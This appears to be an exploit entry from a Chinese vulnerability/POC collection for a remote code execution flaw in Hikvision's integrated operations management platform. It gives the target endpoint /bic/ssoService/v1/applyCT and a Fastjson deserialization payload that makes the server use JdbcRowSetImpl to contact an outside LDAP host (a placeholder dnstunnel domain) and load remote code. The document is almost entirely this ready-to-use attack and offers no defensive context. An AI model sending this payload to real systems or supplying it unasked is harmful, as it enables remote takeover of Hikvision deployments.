## 海康威视综合运营管理平台RCE漏洞

> URL

```
/bic/ssoService/v1/applyCT
```

> Payload

```
{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://xxx.dnstunnel.run","autoCommit":true}}
```
